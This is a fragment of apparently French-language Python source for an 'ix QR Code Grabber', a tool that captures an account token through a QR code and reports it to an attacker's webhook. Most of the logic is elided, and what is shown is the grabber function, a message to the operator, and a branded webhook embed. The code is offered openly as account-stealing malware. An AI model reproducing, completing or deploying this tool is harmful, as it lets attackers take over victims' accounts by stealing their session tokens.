...
def QR_Grabber(Webhook):
    ...
    print(f'\nOuverture d\'un nouveau ix afin que vous puissiez continuer à l\'utiliser pendant que celui-ci enregistre le QR Code !\nN\'hésitez pas à réduire cette fenêtre{Fore.RESET}')
    ...
    return token;
            ...
            embed = {
                "avatar_url":"https://i.pinimg.com/564x/84/5a/19/845a192dec19440e3ad6dd1fcfa75e8b.jpg",
                "embeds": [
                    {
                        "author": {
                            "name": "ix QR Code Grabber",
                            "url": "https://github.com/ix666ix",
                            "icon_url": "https://i.pinimg.com/564x/84/5a/19/845a192dec19440e3ad6dd1fcfa75e8b.jpg"
                        },
                        ...
                        "footer": {
                          "text": "© ix https://github.com/ix666ix"
                        }
                    }
                ]
            }
